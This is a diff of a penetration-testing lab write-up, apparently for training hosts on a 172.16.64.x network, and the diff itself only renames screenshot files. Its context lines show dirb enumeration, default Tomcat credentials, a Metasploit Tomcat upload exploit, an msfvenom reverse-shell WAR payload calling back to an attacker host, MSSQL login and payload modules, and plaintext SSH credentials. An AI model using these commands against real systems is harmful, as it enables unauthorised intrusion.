@@ -215,9 +215,9 @@ dirb http://172.16.64.101:8080/
 dirb http://172.16.64.101:9080/
 ```
 
-![](<../../../.gitbook/assets/image (42).png>)
+![](<../../../.gitbook/assets/image (42) (1).png>)
 
-![](<../../../.gitbook/assets/image (68).png>)
+![](<../../../.gitbook/assets/image (68) (1).png>)
 
 ![](<../../../.gitbook/assets/image (50).png>)
 
@@ -233,21 +233,21 @@ tomcat:s3cret
 use exploit/multi/http/tomcat_mgr_upload)
 ```
 
-![](<../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o revshell.war
 ```
 
-![](<../../../.gitbook/assets/image (58).png>)
+![](<../../../.gitbook/assets/image (58) (1).png>)
 
-![](<../../../.gitbook/assets/image (30).png>)
+![](<../../../.gitbook/assets/image (30) (1).png>)
 
 ![](<../../../.gitbook/assets/image (13).png>)
 
 ![](<../../../.gitbook/assets/image (61) (1).png>)
 
-![](<../../../.gitbook/assets/image (64) (1).png>)
+![](<../../../.gitbook/assets/image (64) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (14).png>)
 
@@ -268,7 +268,7 @@ tomcat:s3cret
 role1:tomcat
 ```
 
-![](<../../../.gitbook/assets/image (40) (1).png>)
+![](<../../../.gitbook/assets/image (40) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (17) (1).png>)
 
@@ -276,13 +276,13 @@ role1:tomcat
 
 ![](<../../../.gitbook/assets/image (22) (1).png>)
 
-![](<../../../.gitbook/assets/image (55) (1).png>)
+![](<../../../.gitbook/assets/image (55) (1) (1).png>)
 
 ## Enumeration - 172.16.64.140
 
 ![](<../../../.gitbook/assets/image (53) (1).png>)
 
-![](<../../../.gitbook/assets/image (41).png>)
+![](<../../../.gitbook/assets/image (41) (1).png>)
 
 > The HyperText Transfer Protocol (HTTP) 401 Unauthorized response status code indicates that the client request has not been completed because it lacks valid authentication credentials for the requested resource.
 
@@ -292,9 +292,9 @@ role1:tomcat
 admin:admin
 ```
 
-![](<../../../.gitbook/assets/image (65).png>)
+![](<../../../.gitbook/assets/image (65) (1).png>)
 
-![](<../../../.gitbook/assets/image (67).png>)
+![](<../../../.gitbook/assets/image (67) (1).png>)
 
 ![](<../../../.gitbook/assets/image (9).png>)
 
@@ -304,14 +304,14 @@ admin:admin
 
 ### Exploitation + Credentials
 
-![](<../../../.gitbook/assets/image (36) (1).png>)
+![](<../../../.gitbook/assets/image (36) (1) (1).png>)
 
 ```
 Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 /var/www/html/project/354253425234234/flag.txt
 ```
 
-![](<../../../.gitbook/assets/image (69).png>)
+![](<../../../.gitbook/assets/image (69) (1).png>)
 
 ## Enumeration - 172.16.64.199
 
@@ -319,7 +319,7 @@ Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 use auxiliary/scanner/mssql/mssql_login 
 ```
 
-![](<../../../.gitbook/assets/image (34) (1).png>)
+![](<../../../.gitbook/assets/image (34) (1) (1).png>)
 
 {% embed url="https://www.offensive-security.com/metasploit-unleashed/hunting-mssql" %}
 
@@ -327,7 +327,7 @@ use auxiliary/scanner/mssql/mssql_login
 use auxiliary/admin/mssql/mssql_exec
 ```
 
-![](<../../../.gitbook/assets/image (59).png>)
+![](<../../../.gitbook/assets/image (59) (1).png>)
 
 {% embed url="https://www.offensive-security.com/metasploit-unleashed/payloads-mssql" %}
 
@@ -337,15 +337,15 @@ use windows/mssql/mssql_payload
 
 ![](<../../../.gitbook/assets/image (4).png>)
 
-![](<../../../.gitbook/assets/image (63) (1).png>)
+![](<../../../.gitbook/assets/image (63) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (66).png>)
+![](<../../../.gitbook/assets/image (66) (1).png>)
 
-![](<../../../.gitbook/assets/image (54) (1).png>)
+![](<../../../.gitbook/assets/image (54) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (32).png>)
 
-![](<../../../.gitbook/assets/image (38) (1).png>)
+![](<../../../.gitbook/assets/image (38) (1) (1).png>)
 
 ```
 ssh://developer:dF3334slKw@172.16.64.182:22
@@ -361,7 +361,7 @@ ssh developer@172.16.64.182
 
 ![](<../../../.gitbook/assets/image (62) (1).png>)
 
-![](<../../../.gitbook/assets/image (18).png>)
+![](<../../../.gitbook/assets/image (18) (1).png>)
 
 ### Flag
 
